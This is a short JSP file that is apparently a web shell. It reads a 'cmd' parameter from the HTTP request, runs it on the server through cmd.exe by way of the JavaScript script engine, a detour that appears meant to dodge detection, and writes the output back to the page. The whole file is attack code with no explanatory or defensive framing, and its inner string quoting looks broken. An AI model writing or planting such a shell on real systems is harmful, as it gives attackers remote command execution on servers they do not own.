<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*,javax.script.*"%>
<%
        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
        BufferedReader object = (BufferedReader)scriptEngineManager.getEngineByName("JavaScript").eval("new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cmd.exe /c "+request.getParameter("cmd")+"").getInputStream()))");

        String line = "";
        String result = "";
        while((line=object.readLine())!=null)
        {
            result = result + line;
        }
        out.println(result);
%>
